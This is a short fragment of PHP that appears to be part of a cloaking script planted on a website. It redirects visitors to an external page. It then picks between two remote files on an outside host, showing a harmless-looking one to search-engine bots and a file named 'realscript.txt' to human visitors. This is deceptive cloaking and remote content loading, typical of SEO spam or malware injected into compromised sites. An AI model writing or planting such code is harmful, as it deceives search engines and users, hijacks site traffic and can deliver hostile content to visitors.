...
header("Location: https://douberman.com/amp/amp-jmifrusim.html");
die;
}

$url = is_bot()
? "https://dangerman.locker/landing/jmifrusim/index.txt"
: "https://dangerman.locker/landing/jmifrusim/realscript.txt";
